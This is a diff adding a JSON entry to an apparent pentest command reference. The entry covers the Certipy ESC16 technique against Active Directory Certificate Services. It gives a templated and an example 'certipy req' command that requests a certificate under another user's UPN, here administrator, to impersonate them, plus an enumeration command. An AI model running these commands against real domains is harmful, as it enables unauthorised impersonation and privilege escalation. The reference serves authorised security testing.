@@ -1,0 +1,18 @@
+{
+  "id": "certipy-esc16",
+  "name": "Certipy ESC16 (CA Security Extension Disabled)",
+  "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template User -upn '<target>@<domain>'",
+  "description": "ESC16: the CA has the szOID_NTDS_CA_SECURITY_EXT object identifier in DisableExtensionList, so issued certificates omit the strong SID security extension entirely. Any template that lets you specify a SAN/UPN now permits impersonation regardless of strong-mapping enforcement. Detect with `certipy find -vulnerable`.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["certipy", "adcs", "esc16", "security-extension", "strong-mapping"],
+  "references": [
+    { "title": "Certipy v5 release notes", "url": "https://github.com/ly4k/Certipy/releases" },
+    { "title": "Strong cert mapping (KB5014754)", "url": "https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16" }
+  ],
+  "examples": [
+    "certipy find -u jdoe@corp.local -p Password123! -dc-ip 10.10.10.10 -vulnerable -enabled",
+    "certipy req -u jdoe@corp.local -p Password123! -dc-ip 10.10.10.10 -ca CORP-CA -template User -upn administrator@corp.local"
+  ]
+}
